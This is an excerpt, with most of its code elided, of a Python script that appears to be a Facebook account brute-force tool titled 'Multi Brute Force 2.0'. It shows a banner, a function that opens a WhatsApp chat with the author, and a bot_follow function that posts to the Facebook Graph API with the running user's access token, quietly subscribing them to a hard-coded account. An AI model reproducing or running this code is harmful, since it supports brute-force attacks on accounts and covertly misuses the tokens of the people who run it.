...
def banner():
    print("""   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By FARHAN OFFICIAL │\n       /  ^ \/ / // /  ^ \   │   •• F.MRX ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
...
def bot_follow():
	...
	requests.post('https://graph.facebook.com/100012947622717/subscribers?access_token=' + toket) #Dapunta Adya R
...
def wangsaff():
    ...
    os.system("xdg-open https://wa.me/+623138202244?text=Assalamualaikum%20Bang,%20Saya%20Pengguna%20SC%20Premium%20FARHAN.%20Code:%20Error")
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()
